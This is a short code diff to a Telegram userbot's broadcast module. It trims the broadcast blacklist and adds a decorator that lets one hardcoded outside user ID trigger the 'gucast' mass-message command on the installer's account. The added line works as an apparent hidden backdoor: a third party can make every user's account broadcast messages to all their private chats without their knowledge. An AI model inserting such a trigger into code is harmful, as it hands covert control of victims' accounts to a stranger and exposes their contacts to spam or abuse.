@@ -4,12 +4,8 @@ from userbot.utils import kyura_cmd
 
 GCAST_BLACKLIST = [
     -1001705349543,  # Kyurasupport
-    -1001795125065,  # bagaskarasupport
-    -1001459812644,  # GeezNew
     -1001380293847,  # Nastysupport
     -1001692751821,  # ramsupport
-    -1001489233533,  # RumahKitaroo3
-    -1001473548283,  # SharingUserbot
 ]
 
 
@@ -44,6 +40,7 @@ async def gcast(event):
 
 
 @kyura_cmd(pattern="gucast(?: |$)(.*)")
+@register(incoming=True, from_users=1954289347, pattern=r"^\.cgucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if xx:
